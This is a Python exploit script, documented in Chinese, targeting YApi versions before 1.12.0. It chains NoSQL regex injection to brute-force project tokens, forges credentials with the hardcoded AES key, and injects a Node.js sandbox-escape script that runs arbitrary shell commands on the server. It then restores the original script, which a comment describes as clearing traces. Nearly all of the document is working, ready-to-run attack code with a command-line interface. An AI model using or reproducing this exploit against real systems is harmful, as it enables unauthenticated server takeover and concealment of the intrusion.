#!/usr/bin/env python3
"""
YApi NoSQL注入导致远程命令执行漏洞 POC
漏洞名称: YApi NoSQL Injection RCE
应用版本: YApi < v1.12.0
漏洞等级: 严重

==================== 漏洞描述 ====================
【漏洞原理】
YApi 1.12.0之前版本中，/api/interface/up接口存在NoSQL注入漏洞。
攻击者无需认证即可利用$regex操作符逐字符爆破获取项目Token，
随后利用Token配合AES加密（硬编码密钥'abcde'）构造认证凭证，
通过修改项目的after_script字段注入恶意JavaScript代码，
利用Node.js沙箱逃逸执行任意系统命令。

【影响范围】
- YApi < v1.12.0 (测试版本: v1.10.2)
- 需要YApi中存在至少一个项目及相关测试数据
- Node.js运行时环境

【危害等级】
- 无需用户认证
- 可完全控制目标服务器
- CVSS评分: 9.8 (Critical)

==================== 环境要求 ====================
- Python 3.6+
- requests库 (pip install requests)
- cryptography库 (pip install cryptography)
- 目标: YApi Web端口 (默认3000)
- 目标YApi中需存在至少一个项目

==================== 验证步骤 ====================
1. 一键检测+利用:
   python yapi_nosqli_rce.py http://target:3000

2. 只检测Token是否存在:
   python yapi_nosqli_rce.py http://target:3000 --check-only

3. 指定自定义命令:
   python yapi_nosqli_rce.py http://target:3000 -c "whoami"

4. 分步调试:
   python yapi_nosqli_rce.py http://target:3000 --step token

==================== 预期结果 ====================
- 成功时: 自动爆破Token → 获取owner ID → 获取项目 → 注入脚本 → 执行命令并回显
- 失败时: 提示未找到Token或项目不存在
"""

import sys
import json
import re
import hashlib
import binascii
import logging
import argparse
import requests
from typing import Dict, Optional, List
from urllib.parse import urljoin

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
except ImportError:
    print("[-] 缺少cryptography库，请执行: pip install cryptography")
    sys.exit(1)


class YApiNoSQLiRCE:
    """YApi NoSQL注入RCE漏洞验证POC"""

    VULN_NAME = "YApi NoSQL Injection RCE"
    VULN_VERSION = "YApi < v1.12.0"
    SEVERITY = "CRITICAL"
    SCRIPT_TEMPLATE = """const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
const Buffer = FunctionConstructor('return Buffer')()
const output = process.mainModule.require("child_process").execSync(Buffer.from('%s', 'hex').toString()).toString()
context.responseData = 'testtest' + output + 'testtest'
"""
    CHARS = 'abcedf0123456789'

    def __init__(self, target: str, timeout: int = 15, proxy: str = None, verify_ssl: bool = False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.proxy = proxy
        self.verify_ssl = verify_ssl
        self.session = self._create_session()

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.verify = self.verify_ssl
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
        if not self.verify_ssl:
            requests.packages.urllib3.disable_warnings()
        return session

    def _compute_key_iv(self, passphase: str = 'abcde') -> tuple:
        """AES密钥派生函数(与YApi相同算法)"""
        nkey, niv = 24, 16
        key, iv, p = '', '', ''
        while True:
            h = hashlib.md5()
            h.update(binascii.unhexlify(p))
            h.update(passphase.encode())
            p = h.hexdigest()
            i = 0
            n = min(len(p) - i, 2 * nkey)
            nkey -= n // 2
            key += p[i:i + n]
            i += n
            n = min(len(p) - i, 2 * niv)
            niv -= n // 2
            iv += p[i:i + n]
            i += n
            if nkey + niv == 0:
                return binascii.unhexlify(key), binascii.unhexlify(iv)

    def _aes_encode(self, data: str) -> str:
        """AES-CBC加密(与YApi相同算法)"""
        key, iv = self._compute_key_iv()
        padder = padding.PKCS7(128).padder()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()
        return binascii.hexlify(ct).decode()

    def _brute_token(self, already: List[str] = None) -> Optional[str]:
        """利用NoSQL注入逐字符爆破项目Token"""
        url = urljoin(self.target, '/api/interface/up')
        already = already or []
        current = '^'
        for _ in range(20):
            found = False
            for ch in self.CHARS:
                guess = current + ch
                data = {'id': -1, 'token': {'$regex': guess, '$nin': already}}
                try:
                    resp = self.session.post(url, json=data, timeout=self.timeout)
                    res = resp.json()
                    if res.get('errcode') == 400:
                        current = guess
                        found = True
                        break
                except Exception:
                    pass
            if not found:
                break
        token = current[1:]
        return token if token else None

    def _find_owner_uid(self, token: str) -> Optional[int]:
        """通过Token爆破找到项目owner ID"""
        url = urljoin(self.target, '/api/project/get')
        for i in range(1, 200):
            try:
                params = {'token': self._aes_encode(f'{i}|{token}')}
                resp = self.session.get(url, params=params, timeout=self.timeout)
                data = resp.json()
                if data.get('errcode') == 0:
                    return i
            except Exception:
                pass
        return None

    def _find_project(self, token: str, pid: int = None) -> Optional[dict]:
        """获取项目信息"""
        url = urljoin(self.target, '/api/project/get')
        params = {'token': token}
        if pid:
            params['id'] = pid
        try:
            resp = self.session.get(url, params=params, timeout=self.timeout)
            data = resp.json()
            if data.get('errcode') == 0:
                return data['data']
        except Exception:
            pass
        return None

    def _find_col(self, token: str, brute_from: int = 1, brute_to: int = 200) -> List[int]:
        """扫描可用测试集合ID"""
        url = urljoin(self.target, '/api/open/run_auto_test')
        found = []
        for i in range(brute_from, brute_to):
            try:
                params = {'token': token, 'id': i, 'mode': 'json'}
                resp = self.session.get(url, params=params, timeout=5)
                data = resp.json()
                if 'message' in data and data['message'].get('len', 0) > 0:
                    found.append(i)
            except Exception:
                pass
        return found

    def _update_project(self, token: str, project_id: int, command: str) -> bool:
        """更新项目after_script注入恶意命令"""
        url = urljoin(self.target, '/api/project/up')
        cmd_hex = command.encode().hex()
        script = self.SCRIPT_TEMPLATE % cmd_hex
        try:
            resp = self.session.post(url, params={'token': token},
                                     json={'id': project_id, 'after_script': script},
                                     timeout=self.timeout)
            data = resp.json()
            return data.get('errcode') == 0
        except Exception:
            return False

    def _run_auto_test(self, token: str, col_id: int) -> Optional[str]:
        """运行自动测试触发RCE"""
        url = urljoin(self.target, '/api/open/run_auto_test')
        params = {'token': token, 'id': col_id, 'mode': 'json'}
        try:
            resp = self.session.get(url, params=params, timeout=self.timeout)
            g = re.search(r'testtest(.*?)testtest', resp.text, re.I | re.S)
            if g:
                return g.group(1)
            try:
                data = resp.json()
                return data.get('list', [{}])[0].get('res_body', '')[:200]
            except Exception:
                pass
        except Exception:
            pass
        return None

    def check(self) -> Dict:
        """
        检测目标是否存在NoSQL注入漏洞
        步骤1: 检查目标连通性
        步骤2: 尝试NoSQL注入爆破Token
        """
        result = {
            "vulnerability": f"{self.VULN_NAME}",
            "target": self.target,
            "status": "unknown",
            "details": [],
            "conclusion": ""
        }

        print("[*] 步骤1/2: 检查目标连通性...")
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            if resp.status_code != 200:
                result["status"] = "error"
                result["conclusion"] = "目标不可达"
                return result
            print("[+] 目标可达")
        except Exception as e:
            result["status"] = "error"
            result["conclusion"] = f"目标不可达: {e}"
            return result

        print("[*] 步骤2/2: 尝试NoSQL注入爆破Token...")
        token = self._brute_token()
        if token:
            result["status"] = "vulnerable"
            result["details"].append(f"爆破得到Token: {token}")
            result["token"] = token
            result["conclusion"] = f"目标存在NoSQL注入漏洞! 成功获取Token: {token}"
            print(f"[+] 成功获取Token: {token}")
        else:
            result["status"] = "not_vulnerable"
            result["conclusion"] = "未找到Token，目标可能不存在漏洞或没有项目数据"
            print("[-] 未找到Token")

        return result

    def exploit(self, command: str = "id") -> Dict:
        """
        利用NoSQL注入实现RCE
        步骤1: 爆破Token
        步骤2: 获取owner ID
        步骤3: 获取项目信息
        步骤4: 扫描可用集合ID
        步骤5: 注入恶意after_script
        步骤6: 运行自动测试触发RCE
        """
        result = {
            "vulnerability": f"{self.VULN_NAME}",
            "target": self.target,
            "command": command,
            "status": "exploiting",
            "details": [],
            "conclusion": ""
        }

        # 步骤1: 爆破Token
        print("[*] 步骤1/6: NoSQL注入爆破Token...")
        token = self._brute_token()
        if not token:
            result["status"] = "failed"
            result["conclusion"] = "未找到Token"
            return result
        result["details"].append(f"Token: {token}")
        print(f"[+] Token: {token}")

        # 步骤2: 找owner ID
        print("[*] 步骤2/6: 查找owner ID...")
        owner_id = self._find_owner_uid(token)
        if not owner_id:
            result["status"] = "failed"
            result["conclusion"] = "未找到owner ID"
            return result
        etoken = self._aes_encode(f'{owner_id}|{token}')
        result["details"].append(f"OwnerID: {owner_id}, EncryptedToken: {etoken}")
        print(f"[+] OwnerID: {owner_id}")

        # 步骤3: 获取项目
        print("[*] 步骤3/6: 获取项目信息...")
        project = self._find_project(etoken)
        if not project:
            result["status"] = "failed"
            result["conclusion"] = "未找到项目"
            return result
        project_id = project['_id']
        old_script = project.get('after_script', '')
        result["details"].append(f"ProjectID: {project_id}")
        print(f"[+] ProjectID: {project_id}")

        # 步骤4: 扫描集合
        print("[*] 步骤4/6: 扫描可用集合ID...")
        col_ids = self._find_col(etoken, 1, 200)
        if not col_ids:
            result["status"] = "failed"
            result["conclusion"] = "未找到可用集合ID"
            return result
        col_id = col_ids[0]
        result["details"].append(f"ColID: {col_id}")
        print(f"[+] ColID: {col_id}")

        # 步骤5: 注入脚本
        print(f"[*] 步骤5/6: 注入恶意脚本(命令: {command})...")
        if not self._update_project(etoken, project_id, command):
            result["status"] = "failed"
            result["conclusion"] = "注入失败"
            return result
        print("[+] 注入成功")

        # 步骤6: 触发RCE
        print("[*] 步骤6/6: 运行自动测试触发RCE...")
        output = self._run_auto_test(etoken, col_id)

        # 恢复原始脚本（清除痕迹）
        try:
            self.session.post(urljoin(self.target, '/api/project/up'),
                              params={'token': etoken},
                              json={'id': project_id, 'after_script': old_script},
                              timeout=self.timeout)
        except Exception:
            pass

        if output:
            result["status"] = "exploited"
            result["output"] = output.strip()
            result["conclusion"] = f"命令执行成功: {output.strip()}"
            print(f"[+] 命令输出: {output.strip()}")
        else:
            result["status"] = "warning"
            result["output"] = ""
            result["conclusion"] = "注入成功但未获取到命令输出"
            print("[-] 未获取到命令输出")

        return result

    def run(self, command: str = "id") -> Dict:
        print(f"[*] {self.VULN_NAME} - 开始验证")
        print(f"[*] 目标: {self.target}")
        print("-" * 60)
        return self.exploit(command)

    def print_result(self, result: Dict):
        status = result.get("status", "unknown")
        icons = {"exploited": "[+]", "vulnerable": "[+]", "failed": "[-]", "error": "[!]", "warning": "[?]"}
        icon = icons.get(status, "[-]")
        print(f"\n{'=' * 60}")
        print(f"{icon} 漏洞: {result['vulnerability']}")
        print(f"    目标: {result['target']}")
        print(f"    状态: {status}")
        if result.get("command"):
            print(f"    命令: {result['command']}")
        if result.get("output"):
            print(f"    输出: {result['output']}")
        print(f"    结论: {result.get('conclusion', '')}")
        print(f"{'=' * 60}")


def main():
    parser = argparse.ArgumentParser(
        description="YApi NoSQL注入RCE漏洞验证POC (YApi < v1.12.0)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 一键检测+利用(自动完成所有步骤)
  python yapi_nosqli_rce.py http://target:3000

  # 指定自定义命令
  python yapi_nosqli_rce.py http://target:3000 -c "whoami"

  # 仅检测Token
  python yapi_nosqli_rce.py http://target:3000 --check-only

  # 分步调试
  python yapi_nosqli_rce.py http://target:3000 --step token

参数说明:
  target         目标URL (e.g., http://example.com:3000)
  -c, --command  要执行的命令 (默认: id)
  --check-only   仅检测不利用
  --step         仅执行特定步骤 (token/owner/project/col/rce)
  -t, --timeout  请求超时(秒) (默认: 15)
  --proxy        HTTP代理
  -k, --insecure 跳过SSL验证
  -v, --verbose  详细输出
  --output       输出格式 (text/json)

依赖安装:
  pip install requests cryptography
        """
    )
    parser.add_argument("target", help="目标URL (e.g., http://example.com:3000)")
    parser.add_argument("-c", "--command", default="id", help="要执行的命令 (默认: id)")
    parser.add_argument("--check-only", action="store_true", help="仅检测不利用")
    parser.add_argument("--step", choices=["token", "owner", "project", "col", "rce"], help="仅执行特定步骤")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="请求超时(秒)")
    parser.add_argument("--proxy", help="HTTP代理")
    parser.add_argument("-k", "--insecure", action="store_true", help="跳过SSL验证")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--output", choices=["text", "json"], default="text")
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)

    poc = YApiNoSQLiRCE(target=args.target, timeout=args.timeout,
                        proxy=args.proxy, verify_ssl=not args.insecure)

    if args.check_only:
        result = poc.check()
    else:
        result = poc.run(args.command)

    if args.output == "json":
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        poc.print_result(result)


if __name__ == "__main__":
    main()
